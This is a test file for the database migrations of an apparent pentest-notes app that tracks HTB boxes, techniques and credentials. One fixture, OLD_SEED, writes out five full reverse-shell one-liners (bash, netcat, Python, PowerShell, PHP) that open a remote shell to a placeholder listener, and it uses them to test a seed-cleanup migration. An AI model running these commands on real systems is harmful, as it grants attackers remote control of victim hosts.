import Database from 'better-sqlite3'
import { existsSync, mkdtempSync, readdirSync, readFileSync, rmSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { dirname, join } from 'node:path'
import { afterEach, expect, test } from 'vitest'
import { PHASES } from '../shared/types'
import { MIGRATIONS, openDb } from './db'

const dirs: string[] = []
afterEach(() => { for (const d of dirs.splice(0)) rmSync(d, { recursive: true, force: true }) })
const tmp = () => { const d = mkdtempSync(join(tmpdir(), 'sl-')); dirs.push(d); return d }

test('migrates a v0 file db without data loss', () => {
  const f = join(tmp(), 'a.db')
  const v0 = new Database(f)
  v0.exec(readFileSync(join(__dirname, 'schema.sql'), 'utf8').replaceAll('{{PHASES}}', PHASES.map((p) => `'${p}'`).join(',')))
  v0.exec(`INSERT INTO boxes (short_id, platform, name, difficulty) VALUES ('H-0001','HTB','Lame','Easy');
    INSERT INTO steps (box_id, phase, position, body) VALUES (1,'Recon',0,'Kerberoast the svc account');
    INSERT INTO techniques (short_id, name, phase) VALUES ('TQ-001','Kerberoasting','PrivEsc');
    INSERT INTO techniques (short_id, name, phase) VALUES ('TQ-002','AS-REP roasting','PrivEsc'), ('TQ-003','Port scanning','Recon'), ('TQ-004','port scanning','Recon');`)
  expect(v0.pragma('user_version', { simple: true })).toBe(0)
  v0.close()

  const db = openDb(f)
  expect(db.pragma('user_version', { simple: true })).toBe(MIGRATIONS.length)
  expect(db.prepare('SELECT name, source, release_date FROM boxes').get()).toEqual({ name: 'Lame', source: 'manual', release_date: null })
  expect(db.prepare('SELECT foothold, privesc, rating FROM boxes').get()).toEqual({ foothold: '', privesc: '', rating: '' })
  expect((db.pragma('table_info(hosts)') as { name: string }[]).map((c) => c.name)).toEqual(expect.arrayContaining(['foothold', 'privesc', 'rating']))
  expect(MIGRATIONS[9]).toContain('ADD COLUMN foothold')
  expect(MIGRATIONS).toHaveLength(19)
  expect((db.prepare('PRAGMA table_info(networks)').all() as any[]).map((c) => c.name)).toContain('entry')
  expect(MIGRATIONS[15]).toContain('networks ADD COLUMN url')
  expect(MIGRATIONS[16]).toContain('credentials ADD COLUMN works_on')
  expect(MIGRATIONS[14]).toContain('ADD COLUMN url')
  expect(MIGRATIONS[13]).toContain('ADD COLUMN services')
  expect(db.prepare('SELECT service, needs, yields FROM techniques').get()).toEqual({ service: 'any', needs: '[]', yields: '[]' })
  expect(db.prepare('SELECT services, haves FROM boxes').get()).toEqual({ services: '[]', haves: '[]' })
  expect((db.pragma('table_info(commands)') as { name: string }[]).map((c) => c.name)).toContain('intent')
  expect((db.pragma('table_info(hosts)') as { name: string }[]).map((c) => c.name)).toEqual(expect.arrayContaining(['services', 'haves']))
  expect(MIGRATIONS[10]).toContain('ADD COLUMN saw')
  expect(MIGRATIONS[11]).toContain('ADD COLUMN applies')
  expect(db.prepare('SELECT saw, think, tried, got, dead FROM steps').get()).toEqual({ saw: '', think: '', tried: '', got: '', dead: 0 })
  expect(db.prepare('SELECT count(*) c FROM steps').get()).toEqual({ c: 1 })
  expect(db.prepare("SELECT count(*) c FROM techniques").get()).toEqual({ c: 4 })
  // existing techniques are numbered per phase in name order; a same-name (NOCASE) tie goes by id
  expect(db.prepare('SELECT name, phase, position FROM techniques ORDER BY phase, position').all()).toEqual([
    { name: 'AS-REP roasting', phase: 'PrivEsc', position: 1 },
    { name: 'Kerberoasting', phase: 'PrivEsc', position: 2 },
    { name: 'Port scanning', phase: 'Recon', position: 1 },
    { name: 'port scanning', phase: 'Recon', position: 2 },
  ])
  expect(db.prepare("SELECT count(*) c FROM techniques WHERE applies = 'any'").get()).toEqual({ c: 4 })
  expect(db.prepare("SELECT box_id FROM search_index WHERE kind='step' AND body LIKE 'Kerberoast%'").get()).toEqual({ box_id: 1 })
  db.close()
  // the pre-migration copy is the untouched v0 db
  const backups = join(dirname(f), 'backups')
  const [name] = readdirSync(backups)
  expect(readdirSync(backups)).toHaveLength(1)
  expect(name).toMatch(/^pre-migration-v0-\d{8}-\d{6}\.db$/)
  const copy = new Database(join(backups, name), { readonly: true })
  expect(copy.pragma('user_version', { simple: true })).toBe(0)
  expect(copy.prepare('SELECT name FROM boxes').get()).toEqual({ name: 'Lame' })
  copy.close()
  // reopening at the latest version must not re-run migrations (the ALTERs would throw) nor back up again
  const again = openDb(f)
  expect(again.pragma('user_version', { simple: true })).toBe(MIGRATIONS.length)
  again.close()
  expect(readdirSync(backups)).toHaveLength(1)
})

test('a brand-new file db is not backed up', () => {
  const dir = tmp()
  openDb(join(dir, 'new.db')).close()
  expect(existsSync(join(dir, 'backups'))).toBe(false)
})

test('migrations 4-5 index networks and reindex boxes from a v3 db with tags as text, then keep the index in sync', () => {
  const f = join(tmp(), 'a.db')
  const v3 = new Database(f)
  v3.exec(readFileSync(join(__dirname, 'schema.sql'), 'utf8').replaceAll('{{PHASES}}', PHASES.map((p) => `'${p}'`).join(',')))
  for (const m of MIGRATIONS.slice(0, 3)) v3.exec(typeof m === 'string' ? m : m.sql)
  v3.pragma('user_version = 3')
  v3.exec(`INSERT INTO networks (short_id, platform, name, tags) VALUES ('N-001','HTB','Dante','["Active Directory"]');
    INSERT INTO boxes (short_id, platform, name, os, difficulty, tags) VALUES ('H-0001','HTB','Forest','Windows','Easy','["Active Directory"]');`)
  v3.close()

  const db = openDb(f)
  expect(db.pragma('user_version', { simple: true })).toBe(MIGRATIONS.length)
  expect(db.prepare("SELECT body FROM search_index WHERE kind = 'box'").all()).toEqual([{ body: 'Windows Active Directory' }])
  const row = () => db.prepare("SELECT ref_id, box_id, title, body FROM search_index WHERE kind = 'network'").all()
  expect(row()).toEqual([{ ref_id: 1, box_id: null, title: 'N-001 Dante', body: 'Active Directory' }])
  db.exec("UPDATE networks SET name = 'Zephyr' WHERE id = 1")
  expect(row()).toEqual([{ ref_id: 1, box_id: null, title: 'N-001 Zephyr', body: 'Active Directory' }])
  db.exec('DELETE FROM networks WHERE id = 1')
  expect(row()).toEqual([])
  expect(db.pragma('foreign_key_check')).toEqual([])
  db.close()
})

test('migration 6: only updates of indexed columns rewrite search rows; every kind still follows update and delete', () => {
  const db = openDb(':memory:')
  db.exec(`INSERT INTO boxes (short_id, platform, name, difficulty) VALUES ('H-0001','HTB','Lame','Easy');
    INSERT INTO steps (box_id, phase, position, body) VALUES (1,'Recon',0,'nmap');
    INSERT INTO techniques (short_id, name, phase) VALUES ('TQ-001','Kerberoasting','PrivEsc');
    INSERT INTO tools (short_id, name) VALUES ('TL-001','nmap');
    INSERT INTO commands (tool_id, purpose, template) VALUES (1,'Scan','nmap -sV');
    INSERT INTO reference_pages (title, body) VALUES ('Ports','22 ssh');
    INSERT INTO networks (short_id, platform, name) VALUES ('N-001','HTB','Dante');
    INSERT INTO hosts (short_id, network_id, name) VALUES ('HS-001',1,'WEB01');
    INSERT INTO host_ips (host_id, ip, is_primary) VALUES (1,'10.0.0.5',1);
    INSERT INTO credentials (network_id, username, kind, secret) VALUES (1,'svc','password','s');`)
  const row = (kind: string) => db.prepare('SELECT rowid AS r, title, body FROM search_index WHERE kind = ?').get(kind) as { r: number; title: string; body: string } | undefined
  // [kind, table, a non-indexed update, an indexed update, the title or body it must produce]
  const cases: [string, string, string, string, string][] = [
    ['box', 'boxes', "status = 'rooted'", "name = 'Lame2'", 'H-0001 Lame2'],
    ['step', 'steps', 'seconds = 60, position = 3, timer_started_at = 5', "body = 'gobuster'", 'gobuster'],
    ['technique', 'techniques', "phase = 'Root'", "name = 'Roasting'", 'Roasting'],
    ['tool', 'tools', "source_id = 'x'", "description = 'scanner'", 'scanner'],
    ['command', 'commands', 'position = 2', "template = 'nmap -p-'", 'nmap -p-'],
    ['reference', 'reference_pages', "source_id = 'y'", "title = 'Ports2'", 'Ports2'],
    ['network', 'networks', 'hosts_in_scope = 9', "name = 'Zephyr'", 'N-001 Zephyr'],
    ['host', 'hosts', "status = 'rooted'", "os = 'Linux'", '10.0.0.5 Linux'],
    ['credential', 'credentials', "secret = 's2', kind = 'ntlm'", "found_note = 'web.config'", 'web.config'],
  ]
  for (const [kind, table, quiet, loud, text] of cases) {
    const before = row(kind)!
    db.exec(`UPDATE ${table} SET ${quiet}`)
    expect(row(kind)!.r, `${kind}: ${quiet}`).toBe(before.r)
    db.exec(`UPDATE ${table} SET ${loud}`)
    expect([row(kind)!.title, row(kind)!.body], `${kind}: ${loud}`).toContain(text)
  }
  const host = row('host')!.r
  db.exec('UPDATE host_ips SET is_primary = 0')
  expect(row('host')!.r).toBe(host)
  db.exec("UPDATE host_ips SET ip = '10.0.0.6'")
  expect(row('host')!.body).toBe('10.0.0.6 Linux')
  for (const [kind, table] of cases.slice().reverse()) {
    db.exec(`DELETE FROM ${table}`)
    expect(row(kind), kind).toBeUndefined()
  }
})

test('migration 7 indexes steps by owner', () => {
  const db = openDb(':memory:')
  expect(db.pragma('user_version', { simple: true })).toBe(MIGRATIONS.length)
  const names = (db.pragma('index_list(steps)') as { name: string }[]).map((i) => i.name)
  expect(names).toEqual(expect.arrayContaining(['steps_box', 'steps_host']))
  db.close()
})

// the old reverse-shell seed shape, as v7 databases hold it
const OLD_SEED: [key: string, purpose: string, template: string][] = [
  ["bash", "Bash, interactive", "bash -i >& /dev/tcp/{{LHOST}}/{{LPORT}} 0>&1"],
  ["nc-mkfifo", "Netcat, mkfifo (no -e)", "rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc {{LHOST}} {{LPORT}} > /tmp/f"],
  ["python3", "Python 3, socket and pty", "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"{{LHOST}}\",{{LPORT}}));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn(\"/bin/sh\")'"],
  ["powershell", "PowerShell, TCPClient", "powershell -nop -c \"$c=New-Object Net.Sockets.TCPClient('{{LHOST}}',{{LPORT}});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$o=(iex $d 2>&1|Out-String);$e=([text.encoding]::ASCII).GetBytes($o+'PS> ');$s.Write($e,0,$e.Length)}\""],
  ["php", "PHP, fsockopen", "php -r '$s=fsockopen(\"{{LHOST}}\",{{LPORT}});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"],
]

/** A db at the version before the seed-cleanup migration, holding the old seed. */
// index of the seed-cleanup migration: the pre-state below is the version just before it
const SEED_CLEANUP = MIGRATIONS.findIndex((m) => typeof m === 'string' && m.includes('seed:reverse-shells'))

function seededV7(extra = '') {
  const f = join(tmp(), 'a.db')
  const old = new Database(f)
  old.exec(readFileSync(join(__dirname, 'schema.sql'), 'utf8').replaceAll('{{PHASES}}', PHASES.map((p) => `'${p}'`).join(',')))
  for (const m of MIGRATIONS.slice(0, SEED_CLEANUP)) old.exec(typeof m === 'string' ? m : m.sql)
  old.pragma(`user_version = ${SEED_CLEANUP}`)
  old.exec("INSERT INTO tools (short_id, name, source_id) VALUES ('TL-001','Reverse shells','seed:tool:reverse-shells')")
  const ins = old.prepare("INSERT INTO commands (tool_id, purpose, template, source_id) VALUES (1, ?, ?, ?)")
  for (const [k, p, t] of OLD_SEED) ins.run(p, t, `seed:revshell:${k}`)
  old.exec("INSERT INTO meta (key, value) VALUES ('seed:reverse-shells', '1')" + (extra ? ';' + extra : ''))
  old.close()
  return openDb(f)
}
const count = (db: Database.Database, sql: string) => (db.prepare(`SELECT count(*) c FROM ${sql}`).get() as { c: number }).c

test('migration 7 removes untouched seeded shells and the empty tool', () => {
  const db = seededV7()
  expect(db.pragma('user_version', { simple: true })).toBe(MIGRATIONS.length)
  expect(count(db, 'commands')).toBe(0)
  expect(count(db, 'tools')).toBe(0)
  expect(count(db, "meta WHERE key = 'seed:reverse-shells'")).toBe(0)
  db.close()
})

test('migration 7 keeps an edited seeded shell as an ordinary command and keeps the tool', () => {
  const db = seededV7("UPDATE commands SET template = template || ' # mine' WHERE source_id = 'seed:revshell:bash'")
  expect(db.prepare('SELECT purpose, source_id FROM commands').all()).toEqual([{ purpose: 'Bash, interactive', source_id: null }])
  expect(count(db, 'tools')).toBe(1)
  db.close()
})

test('migration 7 keeps the tool when the owner added a command under it', () => {
  const db = seededV7("INSERT INTO commands (tool_id, purpose, template) VALUES (1, 'mine', 'x {{LHOST}}')")
  expect(db.prepare('SELECT purpose FROM commands').all()).toEqual([{ purpose: 'mine' }])
  expect(count(db, 'tools')).toBe(1)
  db.close()
})

test('migration 7 keeps the tool when a technique links it', () => {
  const db = seededV7("INSERT INTO techniques (short_id, name, phase) VALUES ('TQ-001','Shells','Recon'); INSERT INTO technique_tools (technique_id, tool_id) VALUES (1, 1)")
  expect(count(db, 'commands')).toBe(0)
  expect(count(db, 'tools')).toBe(1)
  expect(count(db, 'technique_tools')).toBe(1)
  db.close()
})

test('migration 7 is a no-op on a database that was never seeded', () => {
  const f = join(tmp(), 'a.db')
  const old = new Database(f)
  old.exec(readFileSync(join(__dirname, 'schema.sql'), 'utf8').replaceAll('{{PHASES}}', PHASES.map((p) => `'${p}'`).join(',')))
  for (const m of MIGRATIONS.slice(0, SEED_CLEANUP)) old.exec(typeof m === 'string' ? m : m.sql)
  old.pragma(`user_version = ${SEED_CLEANUP}`)
  old.exec("INSERT INTO tools (short_id, name) VALUES ('TL-001','nmap'); INSERT INTO commands (tool_id, purpose, template) VALUES (1, 'scan', 'nmap {{TARGET}}'); INSERT INTO meta (key, value) VALUES ('other', '1')")
  old.close()
  const db = openDb(f)
  expect([count(db, 'tools'), count(db, 'commands'), count(db, 'meta')]).toEqual([1, 1, 1])
  db.close()
})

test('migration 7 keeps a renamed seeded tool', () => {
  const db = seededV7("UPDATE tools SET name = 'My shells'")
  expect(count(db, 'commands')).toBe(0)
  expect(db.prepare('SELECT name FROM tools').all()).toEqual([{ name: 'My shells' }])
  db.close()
})

test('refuses a database from a newer SlingSh0t', () => {
  const f = join(tmp(), 'new.db')
  const d = new Database(f)
  d.pragma('user_version = 999')
  d.close()
  expect(() => openDb(f)).toThrow(/update the app/)
})

test('indexes the foreign keys the cascades and library lists scan', () => {
  const db = openDb(':memory:')
  const idx = (t: string) => (db.pragma(`index_list(${t})`) as { name: string }[]).map((i) => i.name)
  expect(idx('technique_uses')).toContain('technique_uses_step')
  expect(idx('commands')).toEqual(expect.arrayContaining(['commands_technique', 'commands_tool']))
})
